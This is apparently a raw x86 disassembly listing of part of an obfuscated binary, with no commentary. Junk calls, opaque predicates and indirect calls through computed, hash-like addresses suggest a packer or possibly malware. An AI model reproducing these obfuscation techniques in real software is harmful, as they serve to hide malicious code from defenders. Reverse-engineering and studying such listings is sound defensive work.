  407898:	mov    DWORD PTR [ebp-0x10],ecx
  40789b:	mov    DWORD PTR [ebp-0x30],eax
  40789e:	call   0x409aad
  4078a3:	push   0x7ecb9800
  4078a8:	push   0xdaa48400
  4078ad:	push   0x57
  4078af:	push   0x4d
  4078b1:	call   0x40980d
  4078b6:	add    esp,0x10
  4078b9:	push   0x15
  4078bb:	push   0xaa48f700
  4078c0:	push   0x7a8ad200
  4078c5:	call   0x409aad
  4078ca:	add    esp,0xc
  4078cd:	cmp    ebx,0xfffffffb
  4078d0:	jne    0x4078e3
  4078d2:	sub    eax,edi
  4078d4:	push   0x60750300
  4078d9:	push   0x2a
  4078db:	call   0x409736
  4078e0:	add    esp,0x8
  4078e3:	push   0x629d5500
  4078e8:	push   0x37
  4078ea:	call   0x40957c
  4078ef:	add    esp,0x8
  4078f2:	push   0xffffffcf
  4078f4:	push   0x3ee50500
  4078f9:	push   0xffffffee
  4078fb:	push   0xffffffae
  4078fd:	call   0x40980d
  407902:	add    esp,0x10
  407905:	push   0x5c
  407907:	push   0x5b
  407909:	call   0x409736
  40790e:	add    esp,0x8
  407911:	call   0x409461
  407916:	push   0x78
  407918:	push   0xa02c0200
  40791d:	push   0xf25f1f00
  407922:	call   0x409967
  407927:	add    esp,0xc
  40792a:	sub    DWORD PTR [ebp-0x10],edi
  40792d:	mov    edx,DWORD PTR [ebp-0x10]
  407930:	push   0xea174200
  407935:	call   0x409bc5
  40793a:	add    esp,0x4
  40793d:	push   0xffffff88
  40793f:	push   0xb00bab00
  407944:	push   0x29
  407946:	call   0x409d18
  40794b:	add    esp,0xc
  40794e:	add    DWORD PTR [ebp-0x10],edi
  407951:	call   0x409967
  407956:	call   0x40957c
  40795b:	push   0x37
  40795d:	push   0x26
  40795f:	push   0xffffffa2
  407961:	push   0xd2377300
  407966:	push   0xd258cf00
  40796b:	call   0x409736
  407970:	add    esp,0x14
  407973:	push   0x4c
  407975:	push   0x60682300
  40797a:	push   0x62d2f900
  40797f:	push   0x7a
  407981:	push   0xffffffe0
  407983:	call   0x409461
  407988:	add    esp,0x14
  40798b:	add    DWORD PTR [ebp-0x20],esi
  40798e:	add    eax,ebx
  407990:	push   0xffffffac
  407992:	push   0x5f
  407994:	push   0x6014f700
  407999:	call   0x409d18
  40799e:	add    esp,0xc
  4079a1:	mov    esi,edi
  4079a3:	push   0xb03a9b00
  4079a8:	push   0x2691bd00
  4079ad:	push   0x35
  4079af:	call   0x409736
  4079b4:	add    esp,0xc
  4079b7:	test   esi,0x6a
  4079bd:	je     0x4079ee
  4079bf:	push   0x3ed6a200
  4079c4:	call   0x409aad
  4079c9:	add    esp,0x4
  4079cc:	mov    eax,esi
  4079ce:	sub    eax,esi
  4079d0:	push   0x6ebbd200
  4079d5:	push   0x2be2400
  4079da:	push   0x4af0c100
  4079df:	push   0xffffffa7
  4079e1:	push   0xed5d200
  4079e6:	call   0x409967
  4079eb:	add    esp,0x14
  4079ee:	push   0xf263d200
  4079f3:	push   0xf2e89800
  4079f8:	push   0xaeabe400
  4079fd:	call   0x409967
  407a02:	add    esp,0xc
  407a05:	sub    ebx,eax
  407a07:	call   0x409d18
  407a0c:	add    ebx,esi
  407a0e:	push   0x32896200
  407a13:	call   0x409aad
  407a18:	add    esp,0x4
  407a1b:	push   0x57
  407a1d:	push   0x5274c800
  407a22:	push   0x204e9a00
  407a27:	push   0x2a680800
  407a2c:	push   0x8069a600
  407a31:	call   0x409461
  407a36:	add    esp,0x14
  407a39:	push   0x16fd2b00
  407a3e:	push   0x16b8db00
  407a43:	push   0xffffff91
  407a45:	push   0xffffffe7
  407a47:	push   0xaebff200
  407a4c:	call   0x409461
  407a51:	add    esp,0x14
  407a54:	call   0x409d18
  407a59:	sub    ebx,edi
  407a5b:	add    DWORD PTR [ebp-0x20],ebx
  407a5e:	push   0xffffff87
  407a60:	push   0xf2798300
  407a65:	push   0xfaab2c00
  407a6a:	call   0x409aad
  407a6f:	add    esp,0xc
  407a72:	xor    eax,eax
  407a74:	push   0xd2d26200
  407a79:	push   0xc0546100
  407a7e:	push   0xf02fa400
  407a83:	push   0x5073e600
  407a88:	call   0x409461
  407a8d:	add    esp,0x10
  407a90:	push   0x5014b100
  407a95:	call   0x40980d
  407a9a:	add    esp,0x4
  407a9d:	push   0x43a900
  407aa2:	push   0xffffff9e
  407aa4:	push   0xffffffea
  407aa6:	push   0x5ef8bf00
  407aab:	call   0x409bc5
  407ab0:	add    esp,0x10
  407ab3:	push   0xd03fcf00
  407ab8:	push   0x44
  407aba:	push   0x4a
  407abc:	push   0xf27a5200
  407ac1:	push   0x38
  407ac3:	call   0x409aad
  407ac8:	add    esp,0x14
  407acb:	push   0xffffffe4
  407acd:	push   0x46d42400
  407ad2:	push   0xffffff84
  407ad4:	push   0x56
  407ad6:	call   0x409461
  407adb:	add    esp,0x10
  407ade:	push   0xd053bf00
  407ae3:	call   0x409aad
  407ae8:	add    esp,0x4
  407aeb:	lea    edx,[ebp-0x24]
  407aee:	and    ebx,edi
  407af0:	or     DWORD PTR [ebp-0x10],edx
  407af3:	mov    eax,0xbb
  407af8:	xor    DWORD PTR [ebp-0x10],ebx
  407afb:	add    DWORD PTR [ebp-0x10],edx
  407afe:	mov    esi,ebx
  407b00:	add    DWORD PTR [ebp-0x20],eax
  407b03:	add    esi,ebx
  407b05:	test   edx,0x37
  407b0b:	jne    0x407b10
  407b0d:	sub    DWORD PTR [ebp-0x10],esi
  407b10:	mov    ebx,DWORD PTR [ebp-0x10]
  407b13:	add    DWORD PTR [ebp-0x10],ebx
  407b16:	push   edx
  407b17:	push   0x1d
  407b19:	push   0x79
  407b1b:	call   0x40980d
  407b20:	add    esp,0x8
  407b23:	push   0x4efb906e
  407b28:	push   0xf2073300
  407b2d:	push   0xd209bc00
  407b32:	push   0x6a341200
  407b37:	call   0x409aad
  407b3c:	add    esp,0xc
  407b3f:	and    edi,ebx
  407b41:	push   0x46ea00
  407b46:	call   0x40980d
  407b4b:	add    esp,0x4
  407b4e:	push   0xffffffd5
  407b50:	push   0xb044cc00
  407b55:	push   0xf26a2100
  407b5a:	push   0x24
  407b5c:	push   0x1
  407b5e:	call   0x409d18
  407b63:	add    esp,0x14
  407b66:	push   0x6a8b5e00
  407b6b:	push   0x903aaf00
  407b70:	push   0xffffff93
  407b72:	push   0xf2687e00
  407b77:	call   0x409bc5
  407b7c:	add    esp,0x10
  407b7f:	push   0x48
  407b81:	push   0xffffffe7
  407b83:	push   0x32923700
  407b88:	push   0x31
  407b8a:	push   0x5a
  407b8c:	call   0x409d18
  407b91:	add    esp,0x14
  407b94:	xor    esi,esi
  407b96:	push   0x71
  407b98:	call   0x40957c
  407b9d:	add    esp,0x4
  407ba0:	push   0xc6a0f900
  407ba5:	push   0xfffffff7
  407ba7:	push   0xffffffc5
  407ba9:	push   0xaa9c5800
  407bae:	call   0x40957c
  407bb3:	add    esp,0x10
  407bb6:	push   0xffffff83
  407bb8:	push   0xffffff92
  407bba:	push   0xea3e7700
  407bbf:	push   0x52ba3300
  407bc4:	push   0x22d05500
  407bc9:	call   0x409d18
  407bce:	add    esp,0x14
  407bd1:	mov    ebx,DWORD PTR [ebp-0x10]
  407bd4:	or     ebx,edi
  407bd6:	sub    DWORD PTR [ebp-0x10],ebx
  407bd9:	cmp    eax,DWORD PTR ds:0x438468
  407bdf:	jne    0x407c6f
  407be5:	mov    eax,DWORD PTR ds:0x43843c
  407beb:	push   0x1b
  407bed:	push   0x6a6a0700
  407bf2:	push   0x61
  407bf4:	push   0x2b
  407bf6:	push   0x29
  407bf8:	call   0x40980d
  407bfd:	add    esp,0x14
  407c00:	and    esi,edi
  407c02:	mov    ecx,0x40
  407c07:	push   0x46d2f100
  407c0c:	push   0x36dea300
  407c11:	call   0x409461
  407c16:	add    esp,0x8
  407c19:	cmp    esi,0x61
  407c1c:	jne    0x407c6f
  407c1e:	push   0x129bc400
  407c23:	push   0x6a0da200
  407c28:	call   0x409461
  407c2d:	add    esp,0x8
  407c30:	cmp    esi,0x6c
  407c33:	jne    0x407c6f
  407c35:	push   0x46
  407c37:	call   0x409aad
  407c3c:	add    esp,0x4
  407c3f:	push   0x79
  407c41:	push   0x2effa700
  407c46:	call   0x409bc5
  407c4b:	add    esp,0x8
  407c4e:	cmp    esi,eax
  407c50:	jne    0x407c6f
  407c52:	sub    esi,ebx
  407c54:	call   0x409aad
  407c59:	push   0x65
  407c5b:	push   0xfffffffe
  407c5d:	push   0xffffffd8
  407c5f:	push   0x92983a00
  407c64:	call   0x409bc5
  407c69:	add    esp,0x10
  407c6c:	add    DWORD PTR [ebp-0x20],esi
  407c6f:	call   0x409461
  407c74:	call   0x408033
  407c79:	call   0x40980d
  407c7e:	push   0x9e93fc00
  407c83:	push   0xba83bd00
  407c88:	push   0x92ffd600
  407c8d:	push   0x4c
  407c8f:	call   0x409967
  407c94:	add    esp,0x10
  407c97:	mov    esi,DWORD PTR [ebp-0x24]
  407c9a:	mov    eax,0x60
  407c9f:	push   0x78
  407ca1:	call   0x409736
  407ca6:	add    esp,0x4
  407ca9:	push   0x1ef6d600
  407cae:	push   0xffffffa0
  407cb0:	call   0x40980d
  407cb5:	add    esp,0x8
  407cb8:	shr    esi,0x10
  407cbb:	mov    edx,DWORD PTR [ebp-0x20]
  407cbe:	cmp    esi,edi
  407cc0:	jne    0x407ccf
  407cc2:	push   0x806d8d00
  407cc7:	call   0x409aad
  407ccc:	add    esp,0x4
  407ccf:	push   0x55
  407cd1:	push   0xffffffe8
  407cd3:	push   0xd257a100
  407cd8:	push   0xe6beda00
  407cdd:	call   0x409aad
  407ce2:	add    esp,0x10
  407ce5:	cmp    esi,0x74d5
  407ceb:	jne    0x407f87
  407cf1:	push   0xf202a100
  407cf6:	push   0x42
  407cf8:	push   0xc681ab00
  407cfd:	push   0xffffffb4
  407cff:	push   0x36d3dd00
  407d04:	call   0x409461
  407d09:	add    esp,0x14
  407d0c:	call   0x40957c
  407d11:	mov    ecx,0x7515acbb
  407d16:	add    edi,ecx
  407d18:	add    edi,eax
  407d1a:	mov    ebx,DWORD PTR [ebp-0x20]
  407d1d:	cmp    eax,DWORD PTR [ebp-0x2c]
  407d20:	jne    0x407d28
  407d22:	sub    DWORD PTR [ebp-0x10],ebx
  407d25:	sub    DWORD PTR [ebp-0x10],edi
  407d28:	sub    ecx,DWORD PTR [ebp-0x24]
  407d2b:	mov    ebx,0x1b
  407d30:	cmp    eax,DWORD PTR ds:0x43843c
  407d36:	jne    0x407d40
  407d38:	cmp    eax,0xffffff97
  407d3b:	jne    0x407d40
  407d3d:	or     DWORD PTR [ebp-0x10],ebx
  407d40:	call   ecx
  407d42:	cmp    eax,DWORD PTR ds:0x43843c
  407d48:	je     0x407d58
  407d4a:	mov    ebx,DWORD PTR [ebp-0x10]
  407d4d:	cmp    ebx,DWORD PTR ds:0x43843c
  407d53:	jne    0x407d58
  407d55:	sub    DWORD PTR [ebp-0x10],ebx
  407d58:	mov    DWORD PTR [ebp-0x3c],eax
  407d5b:	cmp    edi,esi
  407d5d:	jne    0x407d6b
  407d5f:	push   0xfffffff4
  407d61:	push   0x7d
  407d63:	call   0x409736
  407d68:	add    esp,0x8
  407d6b:	call   0x40980d
  407d70:	mov    edi,0x408a1d
  407d75:	push   0x2992900
  407d7a:	push   0xffffffec
  407d7c:	push   0x2a325e00
  407d81:	push   0x70372200
  407d86:	push   0x62a4fa00
  407d8b:	call   0x409bc5
  407d90:	add    esp,0x14
  407d93:	push   0x2b
  407d95:	push   0xffffff84
  407d97:	push   0xf21ad900
  407d9c:	call   0x40957c
  407da1:	add    esp,0xc
  407da4:	push   DWORD PTR [ebp-0x24]
  407da7:	push   0x74d663de
  407dac:	push   DWORD PTR [ebp-0x3c]
  407daf:	call   edi
  407db1:	sub    edi,eax
  407db3:	push   0xffffffef
  407db5:	call   0x409967
  407dba:	add    esp,0x4
  407dbd:	push   0x2a69c600
  407dc2:	push   0x54
  407dc4:	call   0x40957c
  407dc9:	add    esp,0x8
  407dcc:	test   edi,0xef
  407dd2:	je     0x407e49
  407dd4:	push   0x37
  407dd6:	push   0x58
  407dd8:	push   0x48
  407dda:	push   0x8e8fe400
  407ddf:	call   0x40957c
  407de4:	add    esp,0x10
  407de7:	call   0x409461
  407dec:	push   0xffffff97
  407dee:	push   0xf261f800
  407df3:	push   0x302e5800
  407df8:	push   0x72
  407dfa:	call   0x40957c
  407dff:	add    esp,0x10
  407e02:	add    DWORD PTR [ebp-0x10],eax
  407e05:	and    edi,eax
  407e07:	sub    edi,eax
  407e09:	push   0xd253c800
  407e0e:	push   0x8aa90c00
  407e13:	call   0x409aad
  407e18:	add    esp,0x8
  407e1b:	cmp    edi,DWORD PTR [ebp-0x20]
  407e1e:	jne    0x407e49
  407e20:	sub    edi,eax
  407e22:	push   0x6a475400
  407e27:	push   0xffffff90
  407e29:	push   0x4c
  407e2b:	push   0xab65400
  407e30:	call   0x409736
  407e35:	add    esp,0x10
  407e38:	push   0xffffff9c
  407e3a:	push   0xffffffe1
  407e3c:	push   0x48
  407e3e:	call   0x409967
  407e43:	add    esp,0xc
  407e46:	xor    DWORD PTR [ebp-0x10],edi
  407e49:	add    DWORD PTR [ebp-0x3c],0x28
  407e50:	call   0x409461
  407e55:	push   0x4c
  407e57:	push   0x129a5200
  407e5c:	push   0x800c5f00
  407e61:	push   0xea553600
  407e66:	push   0xffffff88
  407e68:	call   0x409aad
  407e6d:	add    esp,0x14
  407e70:	mov    eax,DWORD PTR [ebp-0x3c]
  407e73:	mov    edx,DWORD PTR [ebp-0x10]
  407e76:	sub    edx,esi
  407e78:	mov    esi,DWORD PTR [ebp-0x20]
  407e7b:	cmp    ebx,DWORD PTR [ebp-0x48]
  407e7e:	jne    0x407f47
  407e84:	cmp    edx,DWORD PTR ds:0x438468
  407e8a:	je     0x407f47
  407e90:	mov    ecx,DWORD PTR ds:0x43843c
  407e96:	mov    edi,DWORD PTR [ebp-0x20]
  407e99:	cmp    esi,0x2ac
  407e9f:	jne    0x407f47
  407ea5:	or     edx,ebx
  407ea7:	mov    ebx,DWORD PTR [ebp-0x20]
  407eaa:	or     DWORD PTR [ebp-0x10],eax
  407ead:	sub    edx,edi
  407eaf:	mov    edi,DWORD PTR [ebp-0x20]
  407eb2:	cmp    ebx,DWORD PTR [ebp-0x38]
  407eb5:	je     0x407f47
  407ebb:	cmp    edi,DWORD PTR ds:0x438468
  407ec1:	je     0x407f47
  407ec7:	cmp    edx,0xd8c7
  407ecd:	jne    0x407f47
  407ecf:	add    esi,esi
  407ed1:	sub    DWORD PTR [ebp-0x20],edx
  407ed4:	test   edi,0x3b
  407eda:	jne    0x407f47
  407edc:	mov    edx,DWORD PTR ds:0x43843c
  407ee2:	mov    DWORD PTR [ebp-0x10],edi
  407ee5:	sub    DWORD PTR [ebp-0x10],ebx
  407ee8:	or     DWORD PTR [ebp-0x10],esi
  407eeb:	add    DWORD PTR [ebp-0x20],ecx
  407eee:	cmp    ebx,edx
  407ef0:	je     0x407f47
  407ef2:	add    edx,ecx
  407ef4:	mov    esi,DWORD PTR ds:0x438468
  407efa:	mov    DWORD PTR [ebp-0x1c],edx
  407efd:	test   eax,0x420095b4
  407f02:	jne    0x407f47
  407f04:	or     DWORD PTR [ebp-0x20],ecx
  407f07:	mov    edx,DWORD PTR ds:0x438468
  407f0d:	cmp    eax,DWORD PTR ds:0x438468
  407f13:	je     0x407f47
  407f15:	mov    ecx,0x6fc8
  407f1a:	mov    edx,DWORD PTR [ebp-0x20]
  407f1d:	and    DWORD PTR [ebp-0x20],edx
  407f20:	sub    DWORD PTR [ebp-0x10],edi
  407f23:	sub    DWORD PTR [ebp-0x1c],ecx
  407f26:	and    edx,eax
  407f28:	sub    DWORD PTR [ebp-0x20],edx
  407f2b:	sub    esi,ecx
  407f2d:	sub    esi,ebx
  407f2f:	cmp    esi,0xfffffffe
  407f32:	je     0x407f47
  407f34:	add    esi,ecx
  407f36:	mov    ebx,DWORD PTR [ebp-0x1c]
  407f39:	add    esi,ebx
  407f3b:	xor    ecx,ecx
  407f3d:	add    DWORD PTR [ebp-0x1c],ecx
  407f40:	sub    esi,ebx
  407f42:	and    esi,edx
  407f44:	sub    DWORD PTR [ebp-0x10],esi
  407f47:	call   eax
  407f49:	push   0xaa4a2600
  407f4e:	call   0x409d18
  407f53:	add    esp,0x4
  407f56:	push   0x8e83bb00
  407f5b:	push   0x35
  407f5d:	call   0x409461
  407f62:	add    esp,0x8
  407f65:	call   0x40957c
  407f6a:	push   0x1c
  407f6c:	push   0xffffffd2
  407f6e:	push   0xe
  407f70:	call   0x409967
  407f75:	add    esp,0xc
  407f78:	push   0x2842000
  407f7d:	push   0xffffffd7
  407f7f:	call   0x409bc5
  407f84:	add    esp,0x8
  407f87:	call   0x409967
  407f8c:	push   0x5f
  407f8e:	push   0x56913d00
  407f93:	push   0xd24fb200
  407f98:	call   0x409d18
  407f9d:	add    esp,0xc
  407fa0:	mov    eax,DWORD PTR [ebp-0x10]
  407fa3:	mov    esi,0x59
  407fa8:	push   0xffffffc6
  407faa:	call   0x409967
  407faf:	add    esp,0x4
  407fb2:	push   0xf6c3ba00
  407fb7:	push   0x3a
  407fb9:	push   0xea48cf00
  407fbe:	call   0x409bc5
  407fc3:	add    esp,0xc
  407fc6:	sub    esi,ebx
  407fc8:	push   0x80258300
  407fcd:	push   0xffffff93
  407fcf:	push   0x3b
  407fd1:	push   0x5a
  407fd3:	call   0x409bc5
  407fd8:	add    esp,0x10
  407fdb:	sub    DWORD PTR [ebp-0x10],esi
  407fde:	call   0x409461
  407fe3:	push   0xaa878a00
  407fe8:	push   0xd2208300
  407fed:	call   0x409967
  407ff2:	add    esp,0x8
  407ff5:	push   0xea5d5200
  407ffa:	push   0x506b6b00
  407fff:	push   0xffffffc5
  408001:	push   0xffffffee
  408003:	call   0x40957c
  408008:	add    esp,0x10
  40800b:	pop    edi
  40800c:	push   0x52
  40800e:	push   0x1ef3d900
  408013:	call   0x409461
  408018:	add    esp,0x8
  40801b:	pop    esi
  40801c:	push   0xffffff85
  40801e:	call   0x40980d
  408023:	add    esp,0x4
  408026:	pop    ebx
  408027:	call   0x409aad
  40802c:	leave  
  40802d:	ret    
  40802e:	int3   
  40802f:	int3   
  408030:	int3   
  408031:	int3   
  408032:	int3   
  408033:	push   ebp
  408034:	mov    ebp,esp
  408036:	sub    esp,0x30
  408039:	mov    ecx,0x42381620
  40803e:	push   0x6aedfb00
  408043:	call   0x40957c
  408048:	add    esp,0x4
  40804b:	push   ebx
  40804c:	mov    DWORD PTR [ebp-0x18],eax
  40804f:	call   0x409d18
  408054:	push   esi
  408055:	push   0x62
  408057:	call   0x40980d
  40805c:	add    esp,0x4
  40805f:	push   edi
  408060:	push   0xde531a00
  408065:	call   0x409967
  40806a:	add    esp,0x4
  40806d:	cmp    eax,0xffffffb4
  408070:	jne    0x40808e
  408072:	cmp    eax,DWORD PTR ds:0x438454
  408078:	jne    0x40808e
  40807a:	push   0x7a5f6500
  40807f:	push   0xe28ca00
  408084:	push   0xffffff9e
  408086:	call   0x40957c
  40808b:	add    esp,0xc
  40808e:	push   0x3a
  408090:	push   0xfffffff9
  408092:	push   0x19
  408094:	call   0x409967
  408099:	add    esp,0xc
  40809c:	mov    DWORD PTR [ebp-0x24],0x5d9016
  4080a3:	mov    ebx,0xd24
  4080a8:	push   0xffffffc8
  4080aa:	push   0x4f
  4080ac:	call   0x409967
  4080b1:	add    esp,0x8
  4080b4:	mov    edi,ebx
  4080b6:	call   0x409d18
  4080bb:	push   0x2a8b7000
  4080c0:	push   0x1e6c9f00
  4080c5:	push   0xffffffef
  4080c7:	call   0x409aad
  4080cc:	add    esp,0xc
  4080cf:	push   0xaae23f00
  4080d4:	push   0xfffffffa
  4080d6:	push   0x5b
  4080d8:	call   0x40980d
  4080dd:	add    esp,0xc
  4080e0:	push   0xffffffde
  4080e2:	push   0x7659a100
  4080e7:	push   0x861900
  4080ec:	push   0xfffffff0
  4080ee:	push   0x66784900
  4080f3:	call   0x40980d
  4080f8:	add    esp,0x14
  4080fb:	push   0xd2f69000
  408100:	push   0x66703600
  408105:	push   0x5f
  408107:	push   0xffffff88
  408109:	call   0x409bc5
  40810e:	add    esp,0x10
  408111:	push   0x52bc8100
  408116:	push   0xffffffce
  408118:	push   0x30945000
  40811d:	push   0xffffffdc
  40811f:	push   0xbe420900
  408124:	call   0x40980d
  408129:	add    esp,0x14
  40812c:	add    edi,eax
  40812e:	push   0xb0c3dd00
  408133:	push   0xffffffa2
  408135:	push   0x3a5e8500
  40813a:	push   0xffffffa8
  40813c:	call   0x40980d
  408141:	add    esp,0x10
  408144:	push   0x62
  408146:	push   0x7a
  408148:	push   0x52ed9600
  40814d:	push   0x1
  40814f:	push   0x5e7b6700
  408154:	call   0x409736
  408159:	add    esp,0x14
  40815c:	call   0x409d18
  408161:	push   0xfffffffd
  408163:	push   0x32257e00
  408168:	push   0x77
  40816a:	call   0x40957c
  40816f:	add    esp,0xc
  408172:	add    edi,eax
  408174:	test   edi,0x84b0
  40817a:	jne    0x408188
  40817c:	and    edi,ebx
  40817e:	call   0x409d18
  408183:	and    edi,ebx
  408185:	sub    DWORD PTR [ebp-0x18],edi
  408188:	call   0x409d18
  40818d:	call   0x408728
  408192:	add    ebx,ebx
  408194:	mov    edx,0x7
  408199:	mov    ecx,DWORD PTR [ebp-0x18]
  40819c:	add    ecx,ebx
  40819e:	cmp    ecx,0xfffffffe
  4081a1:	je     0x4081fd
  4081a3:	add    DWORD PTR [ebp-0x18],edx
  4081a6:	xor    ebx,ebx
  4081a8:	mov    edx,DWORD PTR [ebp-0x18]
  4081ab:	mov    DWORD PTR [ebp-0x18],ebx
  4081ae:	sub    ecx,eax
  4081b0:	sub    edx,edi
  4081b2:	test   edx,0x12
  4081b8:	je     0x4081fd
  4081ba:	sub    edx,ebx
  4081bc:	cmp    ecx,ebx
  4081be:	je     0x4081fd
  4081c0:	mov    ebx,DWORD PTR [ebp-0x18]
  4081c3:	mov    edi,0xcb
  4081c8:	add    DWORD PTR [ebp-0x18],edx
  4081cb:	cmp    ecx,0xffffff9b
  4081ce:	jne    0x4081fa
  4081d0:	or     ebx,ecx
  4081d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4081d5:	mov    DWORD PTR [ebp-0x18],ebx
  4081d8:	add    ecx,ebx
  4081da:	cmp    ecx,0x9
  4081dd:	jne    0x4081fa
  4081df:	mov    edx,ecx
  4081e1:	cmp    edx,DWORD PTR ds:0x438454
  4081e7:	jne    0x4081fa
  4081e9:	and    edx,eax
  4081eb:	sub    edx,ebx
  4081ed:	cmp    edx,DWORD PTR [ebp-0x20]
  4081f0:	jne    0x4081fa
  4081f2:	cmp    edx,DWORD PTR [ebp-0x14]
  4081f5:	jne    0x4081fa
  4081f7:	sub    DWORD PTR [ebp-0x18],edx
  4081fa:	or     DWORD PTR [ebp-0x18],edi
  4081fd:	mov    DWORD PTR [ebp-0x28],eax
  408200:	push   0x5b
  408202:	push   0x3f
  408204:	push   0x46549000
  408209:	push   0xf2c4b400
  40820e:	push   0xea94b000
  408213:	call   0x40980d
  408218:	add    esp,0x14
  40821b:	call   0x408728
  408220:	sub    DWORD PTR [ebp-0x18],ebx
  408223:	mov    DWORD PTR [ebp-0x8],eax
  408226:	push   0x10f21700
  40822b:	push   0x80a09d00
  408230:	push   0x5e0a4b00
  408235:	push   0xffffffb9
  408237:	push   0x1d
  408239:	call   0x409967
  40823e:	add    esp,0x14
  408241:	push   0xca3b6300
  408246:	push   0x4d
  408248:	push   0x43
  40824a:	push   0xaafabd00
  40824f:	call   0x409d18
  408254:	add    esp,0x10
  408257:	call   0x408728
  40825c:	add    edi,ebx
  40825e:	test   edi,0xc3
  408264:	jne    0x408283
  408266:	mov    edx,DWORD PTR [ebp-0x18]
  408269:	cmp    edi,0xffffff8c
  40826c:	je     0x408283
  40826e:	mov    esi,DWORD PTR [ebp-0x18]
  408271:	sub    edx,edi
  408273:	mov    edi,DWORD PTR [ebp-0x18]
  408276:	and    esi,eax
  408278:	sub    DWORD PTR [ebp-0x18],edx
  40827b:	add    DWORD PTR [ebp-0x18],edi
  40827e:	sub    esi,edi
  408280:	sub    DWORD PTR [ebp-0x18],esi
  408283:	mov    DWORD PTR [ebp-0x10],eax
  408286:	mov    edi,0x22
  40828b:	mov    ecx,edx
  40828d:	push   0xfffffffd
  40828f:	push   0xce1c8b00
  408294:	push   0x30c83c00
  408299:	call   0x409aad
  40829e:	add    esp,0xc
  4082a1:	push   0x51
  4082a3:	push   0xa089dc00
  4082a8:	push   0x2f
  4082aa:	push   0xffffff97
  4082ac:	push   0xaab88a00
  4082b1:	call   0x409bc5
  4082b6:	add    esp,0x14
  4082b9:	push   0xfffffff1
  4082bb:	call   0x409aad
  4082c0:	add    esp,0x4
  4082c3:	push   0x36131900
  4082c8:	call   0x409967
  4082cd:	add    esp,0x4
  4082d0:	push   0xeaa77400
  4082d5:	push   0x1e
  4082d7:	push   0xb0caa500
  4082dc:	push   0x6ab34f00
  4082e1:	push   0xd659e000
  4082e6:	call   0x409d18
  4082eb:	add    esp,0x14
  4082ee:	push   0x860eb600
  4082f3:	call   0x409aad
  4082f8:	add    esp,0x4
  4082fb:	sub    DWORD PTR [ebp-0x18],edi
  4082fe:	mov    ecx,DWORD PTR [ebp-0x8]
  408301:	mov    ebx,eax
  408303:	add    DWORD PTR [ebp-0x18],ebx
  408306:	sub    ecx,DWORD PTR [ebp-0x28]
  408309:	mov    edx,DWORD PTR [ebp-0x18]
  40830c:	cmp    ecx,DWORD PTR ds:0x438454
  408312:	je     0x408328
  408314:	sub    DWORD PTR [ebp-0x18],ecx
  408317:	add    DWORD PTR [ebp-0x18],ebx
  40831a:	mov    eax,DWORD PTR ds:0x438454
  408320:	and    DWORD PTR [ebp-0x18],edx
  408323:	add    eax,ebx
  408325:	add    DWORD PTR [ebp-0x18],eax
  408328:	xor    ecx,0xca85238b
  40832e:	mov    ebx,DWORD PTR [ebp-0x18]
  408331:	mov    edi,DWORD PTR [ebp-0x18]
  408334:	sub    ebx,eax
  408336:	add    ebx,edx
  408338:	and    DWORD PTR [ebp-0x18],edi
  40833b:	cmp    ebx,0x9e008a97
  408341:	je     0x408368
  408343:	add    DWORD PTR [ebp-0x18],ecx
  408346:	mov    edi,DWORD PTR ds:0x438454
  40834c:	add    ebx,ebx
  40834e:	cmp    ebx,DWORD PTR ds:0x438454
  408354:	je     0x408361
  408356:	mov    esi,0xbf
  40835b:	sub    DWORD PTR [ebp-0x18],ebx
  40835e:	sub    DWORD PTR [ebp-0x18],esi
  408361:	sub    edi,ebx
  408363:	mov    eax,edi
  408365:	sub    DWORD PTR [ebp-0x18],eax
  408368:	mov    eax,DWORD PTR [ebp-0x10]
  40836b:	add    esi,ebx
  40836d:	sub    esi,eax
  40836f:	add    esi,eax
  408371:	add    DWORD PTR [ebp-0x18],esi
  408374:	sub    eax,DWORD PTR [ebp-0x8]
  408377:	add    DWORD PTR [ebp-0x18],eax
  40837a:	xor    eax,0xca85238e
  40837f:	mov    esi,0xa2d6
  408384:	mov    ebx,0xec
  408389:	cmp    edi,DWORD PTR [ebp-0xc]
  40838c:	je     0x408397
  40838e:	add    ebx,ebx
  408390:	sub    ebx,esi
  408392:	sub    ebx,edi
  408394:	mov    DWORD PTR [ebp-0x18],ebx
  408397:	cmp    ecx,eax
  408399:	je     0x4085e6
  40839f:	push   0xb0836700
  4083a4:	push   0xfa6e0d00
  4083a9:	push   0xffffff82
  4083ab:	push   0xffffffac
  4083ad:	push   0xc0b7cf00
  4083b2:	call   0x40957c
  4083b7:	add    esp,0x14
  4083ba:	push   0x438454
  4083bf:	call   DWORD PTR ds:0x438320
  4083c5:	and    ebx,edi
  4083c7:	cmp    eax,0x47f4
  4083cc:	je     0x40844a
  4083ce:	test   ebx,0x64
  4083d4:	je     0x40844a
  4083d6:	sub    ebx,esi
  4083d8:	mov    ecx,0xd7
  4083dd:	mov    edx,DWORD PTR ds:0x438438
  4083e3:	cmp    ebx,DWORD PTR ds:0x438454
  4083e9:	jne    0x40844a
  4083eb:	mov    esi,0xae
  4083f0:	mov    ecx,DWORD PTR [ebp-0x18]
  4083f3:	add    esi,edi
  4083f5:	add    DWORD PTR [ebp-0x18],esi
  4083f8:	add    ecx,ebx
  4083fa:	cmp    ecx,0x55
  4083fd:	jne    0x40844a
  4083ff:	and    edx,eax
  408401:	add    edx,ebx
  408403:	sub    edx,eax
  408405:	add    edx,ecx
  408407:	mov    ebx,DWORD PTR [ebp-0x18]
  40840a:	mov    ecx,eax
  40840c:	cmp    eax,0xffffffd0
  40840f:	jne    0x40844a
  408411:	mov    edi,DWORD PTR [ebp-0x18]
  408414:	and    edx,esi
  408416:	mov    esi,DWORD PTR [ebp-0x18]
  408419:	sub    ecx,esi
  40841b:	and    ebx,edi
  40841d:	cmp    ecx,eax
  40841f:	jne    0x40844a
  408421:	mov    esi,DWORD PTR [ebp-0x18]
  408424:	or     DWORD PTR [ebp-0x18],esi
  408427:	mov    edi,DWORD PTR ds:0x438438
  40842d:	add    ecx,edi
  40842f:	sub    edx,eax
  408431:	add    edx,esi
  408433:	cmp    ebx,ecx
  408435:	jne    0x40844a
  408437:	sub    DWORD PTR [ebp-0x18],edx
  40843a:	sub    DWORD PTR [ebp-0x18],ecx
  40843d:	cmp    ebx,0xc20211a4
  408443:	jne    0x40844a
  408445:	and    ebx,ecx
  408447:	sub    DWORD PTR [ebp-0x18],ebx
  40844a:	or     eax,eax
  40844c:	je     0x4085e6
  408452:	mov    edx,0xc9
  408457:	add    DWORD PTR [ebp-0x18],edi
  40845a:	mov    ebx,ecx
  40845c:	cmp    ebx,edi
